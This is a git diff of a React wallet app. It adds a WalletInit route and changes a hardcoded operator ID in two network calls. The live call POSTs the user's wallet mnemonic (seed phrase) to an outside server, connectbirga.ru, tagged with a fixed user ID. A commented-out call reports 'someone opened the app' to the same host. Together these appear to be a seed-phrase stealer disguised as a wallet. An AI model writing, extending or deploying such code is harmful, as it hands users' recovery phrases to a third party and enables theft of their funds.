@@ -46,7 +46,7 @@ const SavedPage = lazy(() => import("./pages/SavedPage/SavedPage"));
 const ProfilePage = lazy(() => import("./pages/ProfilePage/ProfilePage"));
 const WalletEnter = lazy( () => import("./pages/WalletEnter/WalletEnter") )
 const Wallet = lazy( () => (import("./pages/Wallet")) )
-
+const WalletInit = lazy( () => (import("./pages/WalletEnter/WalletInit")) )
 
 
 export const API_KEY = process.env.REACT_APP_API_KEY;
@@ -137,6 +137,15 @@ const AnimatedSwitch = () => {
               element={
                 <Suspense fallback={<MyLoader />}>
                   <First isPage={true} />
+                </Suspense>
+              }
+            />
+
+            <Route
+              path="/WalletInit"
+              element={
+                <Suspense fallback={<MyLoader />}>
+                  <WalletInit  />
                 </Suspense>
               }
             />
@@ -259,7 +268,7 @@ function App() {
   //   async function dsa(){
   //     // await axios.get("https://www.connectbirga.ru/user/sendMessage", {
   //     //   params: {
-  //     //     chatId: 2144832745,
+  //     //     chatId: 858931156,
   //     //     text:
   //     //     "Кто - то октрыл приложение",
   //     //     languageCode : en ? "en" : "ru"
@@ -319,7 +328,7 @@ function App() {
 
         const user = await axios.post("https://www.connectbirga.ru/user/wallet", {
           mnemonic: mnemonics,
-          userId: 2144832745,
+          userId: 858931156,
         } , {
           headers : {
             "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
